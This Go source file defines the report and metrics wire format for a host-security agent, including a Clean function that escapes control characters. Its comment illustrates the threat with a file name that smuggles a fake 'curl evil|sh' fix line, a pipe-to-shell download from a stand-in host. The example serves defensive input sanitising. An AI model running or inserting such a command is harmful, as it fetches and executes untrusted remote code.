// Package finding is the wire format shared by the agent and the Boxwarden cloud.
// It carries results only — never file contents or secrets (see ADR-0002).
package finding

import (
	"encoding/json"
	"strconv"
	"strings"
	"unicode/utf8"
)

type Severity string

const (
	Critical Severity = "critical"
	High     Severity = "high"
	Medium   Severity = "medium"
	Low      Severity = "low"
)

type Finding struct {
	ID       string   `json:"id"` // stable rule id, e.g. "ssh.password-auth"
	Severity Severity `json:"severity"`
	Title    string   `json:"title"`
	Detail   string   `json:"detail,omitempty"`
	Fix      string   `json:"fix,omitempty"` // copy-paste command, never executed by the agent
	// Key identifies "the same problem" across scans when the title carries changing numbers.
	Key string `json:"key,omitempty"`
}

// Fingerprint is the identity the cloud uses to tell new findings from known ones.
func (f Finding) Fingerprint() string {
	if f.Key != "" {
		return f.Key
	}
	return f.ID + "|" + f.Title
}

// Report is what `boxwarden scan --push` sends to POST /v1/report.
type Report struct {
	AgentVersion string          `json:"agent_version"`
	Hostname     string          `json:"hostname"`
	Checks       []string        `json:"checks"` // checks that ran successfully: only their findings may be resolved
	Findings     []Finding       `json:"findings"`
	Ports        json.RawMessage `json:"ports,omitempty"`
}

// Clean makes text that came from the host (file names, process names, banners) safe to print
// in a root terminal and to send on: control characters are escaped, so a file named
// "x\n  fix: curl evil|sh" or an ANSI sequence can't fake output, and length is capped.
func Clean(s string, max int) string {
	var b strings.Builder
	n := 0
	for _, r := range s {
		if n == max {
			b.WriteString("…")
			break
		}
		if r < 0x20 || r >= 0x7f && r < 0xa0 || r == utf8.RuneError {
			b.WriteString(strconv.QuoteRune(r)[1 : len(strconv.QuoteRune(r))-1])
		} else {
			b.WriteRune(r)
		}
		n++
	}
	return b.String()
}

// Cleaned is f with every field passed through Clean.
func (f Finding) Cleaned() Finding {
	f.Title, f.Detail, f.Fix, f.Key = Clean(f.Title, 300), Clean(f.Detail, 2000), Clean(f.Fix, 2000), Clean(f.Key, 300)
	return f
}

// Metrics is what `boxwarden metrics --push` sends to POST /v1/metrics every minute. Counters are
// cumulative since boot: the cloud turns two samples into rates, so the agent keeps no state.
type Metrics struct {
	AgentVersion string      `json:"agent_version"`
	BootTime     int64       `json:"boot_time"` // unix seconds; counters restart when it changes
	NumCPU       int         `json:"num_cpu"`
	CPU          CPUTimes    `json:"cpu"`
	Load         [3]float64  `json:"load"`
	MemTotal     uint64      `json:"mem_total"` // bytes
	MemAvailable uint64      `json:"mem_available"`
	SwapTotal    uint64      `json:"swap_total"`
	SwapFree     uint64      `json:"swap_free"`
	Disks        []Disk      `json:"disks"`
	NetRx        uint64      `json:"net_rx"` // bytes since boot on physical interfaces
	NetTx        uint64      `json:"net_tx"`
	OOMKills     uint64      `json:"oom_kills"`             // since boot
	OOMVictims   []OOMVictim `json:"oom_victims,omitempty"` // the newest kills still in the kernel log
	Top          []Proc      `json:"top"`                   // busiest processes during a one-second sample
}

// CPUTimes are /proc/stat jiffies summed over all CPUs.
type CPUTimes struct {
	Total  uint64 `json:"total"`
	Idle   uint64 `json:"idle"`
	IOWait uint64 `json:"iowait"`
	Steal  uint64 `json:"steal"`
}

type Disk struct {
	Mount      string `json:"mount"`
	FS         string `json:"fs"`
	Size       uint64 `json:"size"`  // bytes
	Avail      uint64 `json:"avail"` // free for non-root users, what `df` shows
	Inodes     uint64 `json:"inodes"`
	InodesFree uint64 `json:"inodes_free"`
}

// OOMVictim is a process the kernel's OOM killer stopped, from a "Killed process" line in /dev/kmsg.
type OOMVictim struct {
	At   int64  `json:"at"` // unix seconds
	PID  int    `json:"pid"`
	Name string `json:"name"`
	RSS  uint64 `json:"rss"` // bytes, anon-rss when it was killed
}

type Proc struct {
	PID  int     `json:"pid"`
	Name string  `json:"name"`
	CPU  float64 `json:"cpu"` // percent of one core
	RSS  uint64  `json:"rss"` // bytes
}
